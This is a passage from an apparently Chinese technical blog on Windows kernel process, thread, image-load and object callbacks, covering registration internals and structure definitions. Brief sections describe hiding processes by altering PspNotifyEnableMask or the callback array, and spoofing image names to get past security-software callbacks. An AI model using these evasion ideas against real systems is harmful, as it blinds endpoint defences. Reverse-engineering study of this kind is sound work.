class="title">EX_CALLBACK_ROUTINE_BLOCK</span> &#123;</span></span><br><span class="line">    EX_RUNDOWN_REF RundownProtect; <span class="comment">// +0x00</span></span><br><span class="line">    PVOID Function;                <span class="comment">// +0x08: 驱动提供的回调函数地址</span></span><br><span class="line">    PVOID Context;                 <span class="comment">// +0x10: 标志，0为基础班，2为扩展版</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>Block-&gt;Function = Routine</code>。</li><li><code>Block-&gt;Context = 0/2</code> （标志）。</li><li><code>Block-&gt;RundownProtect</code> 初始化 (通常为 0，但在激活后会变为 <code>0x20</code> 或类似值)</li></ul><p>遍历回调槽 <code>&amp;PspCreateProcessNotifyRoutine[i]</code>，尝试原子插入（最多注册 64 个进程回调函数）</p><p>插入成功则：</p><ul><li>更新对应计数 <code>PspCreateProcessNotifyRoutineExCount</code>；</li><li>设置 <code>PspNotifyEnableMask</code> 中对应 bit（普通&#x2F;EX）；</li></ul><h5 id="回调过程"><a href="#回调过程" class="headerlink" title="回调过程"></a>回调过程</h5><h6 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h6><p>对于进程创建事件，进程回调函数会在 <code>PspInsertThread</code> 函数中被调用</p><p> <code>PspInsertThread</code>(判断Process-&gt;ActiveThreads &#x3D;&#x3D; 1)-&gt; <code>PspCallProcessNotifyRoutines</code></p><p> <code>PspCallProcessNotifyRoutines</code></p><p>检查全局掩码 <code>PspNotifyEnableMask</code></p><ul><li>Bit 1 (0x2): 对应 <code>PsSetCreateProcessNotifyRoutine</code>。</li><li>Bit 2 (0x4): 对应 <code>PsSetCreateProcessNotifyRoutineEx</code>。</li></ul><p>如果 <code>PspNotifyEnableMask</code> 检查通过，函数会在栈上构造 <code>PS_CREATE_NOTIFY_INFO</code> 结构体</p><p>函数遍历全局数组 <code>PspCreateProcessNotifyRoutine</code>（最大 64 个槽位）执行注册的回调函数</p><h6 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h6><ol><li>修改 <code>PspNotifyEnableMask</code></li><li>修改 <code>PspCreateProcessNotifyRoutine</code> 数组内容</li></ol><h6 id="拦截进程"><a href="#拦截进程" class="headerlink" title="拦截进程"></a>拦截进程</h6><p>修改 <code>NotifyInfo-&gt;CreationStatus</code></p><p>代码在每次执行完 Ex 回调后，都会检查 <code>NotifyInfo</code>中的 <code>CreationStatus</code> 成员：</p><p>一旦检测到错误码，循环中止，并且随后调用 <code>PsTerminateProcess</code></p><h6 id="欺骗-Spoofing"><a href="#欺骗-Spoofing" class="headerlink" title="欺骗(Spoofing)"></a>欺骗(Spoofing)</h6><p><code>NotifyInfo</code> 结构体是在栈上分配并传递给所有回调的。</p><p>如果能 hook <code>PspCallProcessNotifyRoutines</code> 或者在第一个回调中修改 <code>NotifyInfo-&gt;ImageFileName</code> 或 <code>CommandLine</code> 指针指向伪造的字符串。 后续执行的安全软件回调会读取到伪造的信息（例如将 <code>malware.exe</code> 伪装成 <code>svchost.exe</code>），从而绕过基于文件名的检测规则。</p><h6 id="进程退出"><a href="#进程退出" class="headerlink" title="进程退出"></a>进程退出</h6><p>对于进程退出事件则是在 <code>PspExitProcess</code> 函数中调用的回调函数。</p><p><code>PspExitProcess</code>(判断EPROCESS-&gt;Flags3 &#x3D;&#x3D;0  || EPROCESS-&gt;PicoContext)-&gt;<code>PspCallProcessNotifyRoutines</code></p><p><code>NotifyInfo</code>为NULL</p><h4 id="线程回调"><a href="#线程回调" class="headerlink" title="线程回调"></a>线程回调</h4><p>线程回调允许驱动在线程创建与销毁事件发生时接收通知 ，以实现监控、日志记录、安全检测等功能。Windows 提供了线程回调函数 <code>PCREATE_THREAD_NOTIFY_ROUTINE</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span> <span class="params">(*PCREATE_THREAD_NOTIFY_ROUTINE)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE ProcessId,   <span class="comment">// 所属进程的 PID</span></span></span><br><span class="line"><span class="params">    _In_ HANDLE ThreadId,    <span class="comment">// 线程 ID</span></span></span><br><span class="line"><span class="params">    _In_ BOOLEAN Create      <span class="comment">// TRUE 表示线程创建，FALSE 表示线程销毁</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>注册&#x2F;移除回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsSetCreateThreadNotifyRoutine</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsRemoveCreateThreadNotifyRoutine</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>PsSetCreateThreadNotifyRoutineEx</code> 是 Windows 10 引入的增强线程回调接口，允许驱动程序注册用于监听系统范围内线程创建和销毁事件的回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsSetCreateThreadNotifyRoutineEx</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PSCREATETHREADNOTIFYTYPE NotifyType,    <span class="comment">// 枚举类型，表示要注册哪种类型的线程通知机制</span></span></span><br><span class="line"><span class="params">    _In_ PVOID NotifyInformation                 <span class="comment">// 实际上是 PCREATE_THREAD_NOTIFY_ROUTINE 的函数指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>PsSetCreateThreadNotifyRoutineEx</code> 注册的回调函数依旧使用 <code>PsRemoveCreateThreadNotifyRoutine</code> 卸载。</p><p>PSCREATETHREADNOTIFYTYPE指定通知类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PSCREATETHREADNOTIFYTYPE</span> &#123;</span></span><br><span class="line">    PsCreateThreadNotifyNonSystem = <span class="number">0</span>,  <span class="comment">// 回调在新线程上执行</span></span><br><span class="line">    PsCreateThreadNotifySubsystems = <span class="number">1</span>  <span class="comment">// 回调为所有子系统线程调用</span></span><br><span class="line">&#125; PSCREATETHREADNOTIFYTYPE;</span><br></pre></td></tr></table></figure><h5 id="注册过程-1"><a href="#注册过程-1" class="headerlink" title="注册过程"></a>注册过程</h5><p>都会调用 <code>PspSetCreateThreadNotifyRoutine</code>函数，扩展版还是和进程回调注册一样检查驱动签名</p><p>和进程回调注册一样分配 <code>_EX_CALLBACK_ROUTINE_BLOCK</code> (24字节)。</p><p><code>nt!PspCreateThreadNotifyRoutine</code>同样是 64 个槽位 (<code>0x40</code>)。</p><p>和进程回调注册完全一样的指针编码（地址 | 0xF）和原子插入</p><p>PspNotifyEnableMask全局掩码</p><ul><li>Bit 3 (Value 8) ：启用普通线程通知（包括 NonSystem 类型）。</li><li>Bit 4 (Value 16) ：启用 Ex 扩展线程通知（Subsystems）。</li></ul><h5 id="回调过程-1"><a href="#回调过程-1" class="headerlink" title="回调过程"></a>回调过程</h5><p>普通线程创建通知</p><p><code>PspInsertThread</code>(判断EPROCESS-&gt;Flags3 &#x3D;&#x3D;0  || EPROCESS-&gt;PicoContext)-&gt;<code>PspCallThreadNotifyRoutines</code></p><p><code>PspCallThreadNotifyRoutines</code>检查 <code>PspNotifyEnableMask</code>的第3位，检查通过，函数遍历全局数组 <code>PspCreateThreadNotifyRoutine</code>（最大64个槽位）执行注册的回调函数。</p><p>子系统线程创建通知</p><p>发生在 <code>PspInitializeThunkContext</code>函数中，在 <code>RtlInitializeExtendedContext</code> （计算并分配用于存储处理器上下文）之后，但在 <code>PspSetContextThreadInternal</code> （获取当前线程的寄存器基础状态）之前，因此可以直接操作当前线程的内存、寄存器（Trap Frame）。</p><p>线程结束通知</p><p><code>PspExitProcess</code>(判断EPROCESS-&gt;Flags3 &#x3D;&#x3D;0  || EPROCESS-&gt;PicoContext)-&gt;<code>PspCallThreadNotifyRoutines</code></p><h4 id="模块回调"><a href="#模块回调" class="headerlink" title="模块回调"></a>模块回调</h4><p>模块回调是允许驱动程序在任何模块（包括 EXE、DLL、SYS）加载到进程地址空间时收到通知 ，以便实现监控、日志记录、DLL 注入检测、签名验证等功能。</p><p>Windows 提供的模块回调函数类型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span> <span class="params">(*PLOAD_IMAGE_NOTIFY_ROUTINE)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ PUNICODE_STRING FullImageName, <span class="comment">// 映像完整路径（可能为 NULL）</span></span></span><br><span class="line"><span class="params">    _In_ HANDLE ProcessId,                  <span class="comment">// 映像加载目标进程 ID（0 表示系统进程）</span></span></span><br><span class="line"><span class="params">    _In_ PIMAGE_INFO ImageInfo              <span class="comment">// 映像加载信息结构体指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>PIMAGE_INFO</code> 结构体描述了加载的映像的地址、大小和加载类型等信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_INFO</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG Properties;                                         <span class="comment">// 0x00: 属性标志位集合（用于快速判断加载类型）</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG ImageAddressingMode  : <span class="number">8</span>;  <span class="comment">// [bit 0–7]  映像寻址模式：0 = 32位，1 = 64位，其他值为保留</span></span><br><span class="line">            ULONG SystemModeImage      : <span class="number">1</span>;  <span class="comment">// [bit 8]    📌映像是否在内核模式下加载（例如内核驱动）</span></span><br><span class="line">            ULONG ImageMappedToAllPids : <span class="number">1</span>;  <span class="comment">// [bit 9]    是否映射到所有进程（例如共享模块）</span></span><br><span class="line">            ULONG ExtendedInfoPresent  : <span class="number">1</span>;  <span class="comment">// [bit 10]   是否存在扩展映像信息（IMAGE_INFO_EX 结构）</span></span><br><span class="line">            ULONG MachineTypeMismatch  : <span class="number">1</span>;  <span class="comment">// [bit 11]   架构不匹配标志（如加载 x86 模块到 x64）</span></span><br><span class="line">            ULONG ImageSignatureLevel  : <span class="number">4</span>;  <span class="comment">// [bit 12–15]映像签名级别（Windows Defender 驱动执行控制级别）</span></span><br><span class="line">            ULONG ImageSignatureType   : <span class="number">3</span>;  <span class="comment">// [bit 16–18]映像签名类型（PE 签名、Catalog 等）</span></span><br><span class="line">            ULONG ImagePartialMap      : <span class="number">1</span>;  <span class="comment">// [bit 19]   如果整个映像未完全映射则为 1（通常用于特殊加载方式）</span></span><br><span class="line">            ULONG Reserved             : <span class="number">12</span>; <span class="comment">// [bit 20–31]保留字段（必须为 0，供系统未来使用）</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    PVOID ImageBase;                        <span class="comment">// 0x04 / 0x08: 映像映射到进程地址空间中的基地址</span></span><br><span class="line">    ULONG ImageSelector;                    <span class="comment">// 0x08 / 0x10: 保留字段，仅用于 x86（段选择器，现代系统基本无用）</span></span><br><span class="line">    SIZE_T ImageSize;                       <span class="comment">// 0x0C / 0x18: 映像的大小（以字节为单位）</span></span><br><span class="line">    ULONG ImageSectionNumber;              <span class="comment">// 0x10 / 0x20: 所加载映像在 PE 文件中的节索引（可用于调试或定位符号）</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_INFO, *PIMAGE_INFO;</span><br></pre></td></tr></table></figure><p>模块回调函数 <code>PLOAD_IMAGE_NOTIFY_ROUTINE</code> 的注册和移除函数是两个不同的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsSetLoadImageNotifyRoutine</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsRemoveLoadImageNotifyRoutine</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>PsSetLoadImageNotifyRoutineEx</code> 是 Win10 引入的模块回调注册函数，相比于旧的 <code>PsSetLoadImageNotifyRoutine</code>，此版本支持传入  Flags 参数 ，以便控制回调行为，如是否通知跨架构（x86&#x2F;x64）映像等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">PsSetLoadImageNotifyRoutineEx</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR Flags</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Flags目前只支持 <code>PS_IMAGE_NOTIFY_CONFLICTING_ARCHITECTURE(0x1)</code></p><h5 id="注册过程-2"><a href="#注册过程-2" class="headerlink" title="注册过程"></a>注册过程</h5><p><code>PsSetLoadImageNotifyRoutine</code>直接调用 <code>PsSetLoadImageNotifyRoutineEx(a1,0)</code>，因此两者注册过程基本一致</p><p>和进程&#x2F;线程回调一模一样，申请 24 字节的 <code>_EX_CALLBACK_ROUTINE_BLOCK</code></p><ul><li><code>+0x00</code>: RundownProtect</li><li><code>+0x08</code>: 回调函数地址 (<code>NotifyRoutine</code>)</li><li><code>+0x10</code>: Flags (<code>a2</code>，值为 0 或 1)</li></ul><p>然后调用完全相同的原子交换函数 <code>ExCompareExchangeCallBack</code>，寻找 <code>PspLoadImageNotifyRoutine</code> 数组中的空槽（NULL），并将经过编码的指针（<code>Address | 0xF</code>）写入。</p><p>然后设置 <code>PspNotifyEnableMask</code>的第0位。后续是ETW 事件相关……</p><h5 id="回调过程-2"><a href="#回调过程-2" class="headerlink" title="回调过程"></a>回调过程</h5><p>在 <code>PsCallImageNotifyRoutines</code>检查 <code>PspNotifyEnableMask</code>第0位，遍历 <code>PspLoadImageNotifyRoutine</code> 数组（最大 64 个槽位），执行注册的回调函数。</p><p>交叉引用发现有三个函数调用它：</p><p>MiDriverLoadSucceeded：在驱动对象的 Section 对象创建成功，且内存控制区（Control Area）初始化之后。</p><p>DbgkCreateThread：在第一个线程初始化时运行，补发已经映射好的模块（EXE 和 NTDLL）的加载通知。</p><p>MiMapViewOfImageSection：<code>LoadLibrary</code> 加载的 DLL 或手动 Map 的内存映像。回调是在内存映射（Mapping）完成之后，但在 DLL 的入口点（DllMain）执行之前触发的。此时文件已经被映射到虚拟内存中，<code>ImageBase</code> 和 <code>ImageSize</code> 已确定。</p><h3 id="对象回调"><a href="#对象回调" class="headerlink" title="对象回调"></a>对象回调</h3><p>在Windows内核中， 对象回调机制（Object Callbacks）是一种安全和监控机制，允许内核模式驱动程序注册特定的回调函数，以监视或拦截对某些内核对象（例如进程、线程、文件等）的操作。</p><h4 id="注册-卸载回调"><a href="#注册-卸载回调" class="headerlink" title="注册&#x2F;卸载回调"></a>注册&#x2F;卸载回调</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册对象访问回调（要求驱动签名）</span></span><br><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">ObRegisterCallbacks</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _In_ POB_CALLBACK_REGISTRATION CallbackRegistration,  <span class="comment">// 指向 OB_CALLBACK_REGISTRATION 结构体：   </span></span></span><br><span class="line"><span class="params">    _Outptr_ PVOID *RegistrationHandle                     <span class="comment">// 返回注册后的句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">// 注销回调函数</span></span><br><span class="line">NTKERNELAPI</span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">ObUnRegisterCallbacks</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID RegistrationHandle                         <span class="comment">// 通过 ObRegisterCallbacks 返回的注册句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>OB_CALLBACK_REGISTRATION</code> 结构体描述一次对象访问回调注册请求，包含回调的元信息、目标对象类型、回调函数数组等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_CALLBACK_REGISTRATION</span> &#123;</span></span><br><span class="line">    USHORT Version;          <span class="comment">// 结构体版本号，OB_FLT_REGISTRATION_VERSION(0x100)，用ObGetFilterVersion函数动态获取</span></span><br><span class="line">    USHORT OperationRegistrationCount;         <span class="comment">// 数组元素数量，注册的对象类型数量（通常为 1~3）</span></span><br><span class="line">    UNICODE_STRING Altitude;    <span class="comment">// 优先级，格式：&lt;数字&gt;.&lt;驱动/产品标识符&gt;</span></span><br><span class="line">    PVOID RegistrationContext;  <span class="comment">// 自定义上下文指针，在PreOperation/PostOperation回调中可通过 RegistrationContext 参数获取</span></span><br><span class="line">    OB_OPERATION_REGISTRATION* OperationRegistration;</span><br><span class="line">&#125; OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;</span><br></pre></td></tr></table></figure><p><code>OB_OPERATION_REGISTRATION</code> 描述驱动希望拦截的对象类型、操作类型以及对应的回调函数。每个 <code>OB_OPERATION_REGISTRATION</code> 项表示一类对象（如进程、线程）的访问行为拦截配置。它提供两种类型的回调函数：</p><ul><li><code>PreOperation</code>：在句柄创建&#x2F;复制发生之前调用，允许回调函数修改访问权限，直接阻止访问行为。</li><li><code>PostOperation</code>：在句柄创建&#x2F;复制完成之后调用，不再允许修改访问权限。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_OPERATION_REGISTRATION</span> &#123;</span></span><br><span class="line">    In POBJECT_TYPE *ObjectType; <span class="comment">// 指向要监控的对象类型的全局指针</span></span><br><span class="line">    In OB_OPERATION Operations;   <span class="comment">// 要拦截的操作类型</span></span><br><span class="line">    In POB_PRE_OPERATION_CALLBACK PreOperation;    <span class="comment">// 预操作回调函数，在对象句柄创建或复制之前被调用。</span></span><br><span class="line">    In POB_POST_OPERATION_CALLBACK PostOperation; <span class="comment">// 后操作回调函数，在句柄创建/复制完成后调用</span></span><br><span class="line">&#125; OB_OPERATION_REGISTRATION, *POB_OPERATION_REGISTRATION;</span><br></pre></td></tr></table></figure><p>监控对象通过 <code>ObjectType</code> 字段描述，这个字段描述要拦截的对象种类 ，如进程、线程、注册表项等。我们需要将其填充为一个系统导出的全局的对象类型描述符指针。</p><table><thead><tr><th>对象名称</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>进程</td><td><code>PsProcessType</code></td><td>所有 <code>EPROCESS</code> 对象</td></tr><tr><td>线程</td><td><code>PsThreadType</code></td><td>所有 <code>ETHREAD</code> 对象</td></tr><tr><td>注册表键</td><td><code>CmKeyObjectType</code></td><td>所有注册表项对象（<code>KEY_OBJECT</code>）</td></tr><tr><td>事件</td><td><code>ExEventObjectType</code></td><td>事件对象（非用户事件）</td></tr><tr><td>信号量等</td><td><code>ExSemaphoreObjectType</code></td><td>同步对象（部分可见）</td></tr></tbody></table><p><code>Operations</code>字段值可以为以下之一或组合。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> OB_OPERATION_HANDLE_CREATE     0x00000001  <span class="comment">// 例如 ZwOpenProcess</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OB_OPERATION_HANDLE_DUPLICATE  0x00000002  <span class="comment">// 例如 DuplicateHandle</span></span></span><br></pre></td></tr></table></figure><ul><li><code>OB_OPERATION_HANDLE_CREATE</code>：当系统执行创建一个新对象句柄（handle）时触发。</li><li><code>OB_OPERATION_HANDLE_DUPLICATE</code>：当系统执行复制一个已存在的对象句柄时触发。</li></ul><h5 id="PreOperation"><a href="#PreOperation" class="headerlink" title="PreOperation"></a>PreOperation</h5><p>预操作回调函数，只能返回OB_PREOP_SUCCESS。函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">OB_PREOP_CALLBACK_STATUS</span></span><br><span class="line"><span class="params">(*POB_PRE_OPERATION_CALLBACK)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_    PVOID RegistrationContext,                          <span class="comment">// 注册时提供的上下文指针，驱动可用于传递状态或配置</span></span></span><br><span class="line"><span class="params">    _Inout_ POB_PRE_OPERATION_INFORMATION OperationInformation  <span class="comment">// 包含此次对象访问操作的详细信息</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>RegistrationContext</code> 参数来自于注册回调函数时 <code>OB_CALLBACK_REGISTRATION</code> 结构体的 <code>RegistrationContext</code> 成员，传递 <strong>用户</strong> 自定义的参数。</p><p><code>OperationInformation</code> 参数存放了发生回调时保存的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_PRE_OPERATION_INFORMATION</span> &#123;</span></span><br><span class="line">    _In_ OB_OPERATION Operation;   <span class="comment">// 当前操作类型OB_OPERATION_HANDLE_CREATE(0x1)/DUPLICATE(0x2)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        _In_ ULONG Flags;         <span class="comment">// 位标志字段，当前仅定义了 KernelHandle 位</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            _In_ ULONG KernelHandle : <span class="number">1</span>; <span class="comment">// 若为 1，表示此操作为内核句柄操作，驱动不可干预</span></span><br><span class="line">            _In_ ULONG Reserved     : <span class="number">31</span>;<span class="comment">// 保留</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;; </span><br><span class="line">    _In_ PVOID Object; <span class="comment">// 被访问的对象指针</span></span><br><span class="line">    _In_ POBJECT_TYPE ObjectType;  <span class="comment">// 被访问对象的类型指针</span></span><br><span class="line">    _Out_ PVOID CallContext;  <span class="comment">// 自定义上下文，用户可读写字段，可在PreOperation中设置，在PostOperation中获取</span></span><br><span class="line">    _In_ POB_PRE_OPERATION_PARAMETERS Parameters;  <span class="comment">// 包含访问操作的参数信息（联合体，依操作类型不同而异）</span></span><br><span class="line"></span><br><span class="line">&#125; OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;</span><br></pre></td></tr></table></figure><p><code>OB_PRE_OPERATION_INFORMATION</code> 结构体主要描述了事件类型和内核对象相关信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef union _OB_PRE_OPERATION_PARAMETERS &#123;</span><br><span class="line">    OB_PRE_CREATE_HANDLE_INFORMATION      CreateHandleInformation;     // 用于 OB_OPERATION_HANDLE_CREATE</span><br><span class="line">    OB_PRE_DUPLICATE_HANDLE_INFORMATION   DuplicateHandleInformation;  // 用于 OB_OPERATION_HANDLE_DUPLICATE</span><br><span class="line">&#125; OB_PRE_OPERATION_PARAMETERS, *POB_PRE_OPERATION_PARAMETERS;</span><br></pre></td></tr></table></figure><p>OB_PRE_CREATE_HANDLE_INFORMATION</p><p>可以给指定的进程句柄降权。由于是在创建句柄前的回调，因此此时句柄还未创建，也就不会在参数中传入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION &#123;</span><br><span class="line">    _Inout_ ACCESS_MASK DesiredAccess;          // 可修改：最终授予用户的访问权限</span><br><span class="line">    _In_    ACCESS_MASK OriginalDesiredAccess;  // 只读：用户原始请求的访问权限</span><br><span class="line">&#125; OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;</span><br></pre></td></tr></table></figure><p>OB_PRE_DUPLICATE_HANDLE_INFORMATION</p><p>由于是进行句柄复制，因此会同时传递句柄权限，源进程和目标进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_PRE_DUPLICATE_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">    _Inout_ ACCESS_MASK DesiredAccess;          <span class="comment">// 可修改：目标进程最终获得的访问权限</span></span><br><span class="line">    _In_    ACCESS_MASK OriginalDesiredAccess;  <span class="comment">// 只读：原始复制请求的权限</span></span><br><span class="line">    _In_    PVOID SourceProcess;                <span class="comment">// 源进程的 EPROCESS 指针（原始句柄所有者）</span></span><br><span class="line">    _In_    PVOID TargetProcess;                <span class="comment">// 目标进程的 EPROCESS 指针（接收者）</span></span><br><span class="line">&#125; OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;</span><br></pre></td></tr></table></figure><h5 id="PostOperation"><a href="#PostOperation" class="headerlink" title="PostOperation"></a>PostOperation</h5><p>后操作回调函数，是在对象访问操作（如创建或复制句柄）完成之后。其函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span></span><br><span class="line"><span class="params">(*POB_POST_OPERATION_CALLBACK)</span><span 